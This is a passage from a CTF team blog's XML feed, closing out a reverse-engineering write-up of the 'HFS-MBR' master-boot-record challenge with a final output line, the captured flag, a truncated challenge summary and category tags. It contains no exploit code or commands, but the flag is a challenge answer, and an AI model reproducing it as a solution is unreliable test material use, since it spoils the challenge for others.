loaded at 100f:0100 (0x101f0) and ready <span class="keyword">for</span> some binary carna</span><br><span class="line">ge!</span><br></pre></td></tr></table></figure></p><p>The flag was <strong>HFS-MBR: midnight{w0ah_Sh!t_jU5t_g0t_REALmode}</strong></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Hfs-mbr 213&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;We made a military-grade secure OS for HFS me
      
    
    </summary>
    
      <category term="Reverse" scheme="https://teamrocketist.github.io/categories/Reverse/"/>
    
    
      <category term="ida" scheme="https://teamrocketist.github.io/tags/ida/"/>
    
      <category term="mbr" scheme="https://teamrocketist.github.io/tags/mbr/"/>
    
  </entry>
  
</feed>
